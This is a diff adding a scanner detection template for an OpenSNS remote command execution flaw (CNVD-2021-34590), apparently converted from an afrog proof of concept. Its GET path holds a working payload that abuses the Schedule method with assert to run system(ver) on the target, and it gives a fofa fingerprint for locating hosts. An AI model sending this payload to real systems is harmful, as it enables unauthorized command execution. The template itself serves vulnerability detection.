@@ -1,0 +1,29 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - 分享至微博
+          - <img src="/Application/Weibo/Static/images/share_default.png">
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/index.php?s=weibo/Share/shareBox&query=app=Common%26model=Schedule%26method=runSchedule%26id[status]=1%26id[method]=Schedule-%3E_validationFieldItem%26id[4]=function%26[6][]=%26id[0]=cmd%26id[1]=assert%26id[args]=cmd=system(ver)'
+id: CNVD-2021-34590
+info:
+  author: daffainfo
+  description: |-
+    OpenSNS 存在远程命令执行漏洞，攻击者通过漏洞发送特定的请求包可以执行任意命令
+    fofa: icon_hash="1167011145"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: OpenSNS Application ShareController.class.php 远程命令执行漏洞
+  severity: critical
+  tags: cnvd,cnvd2021,rce,argus-import
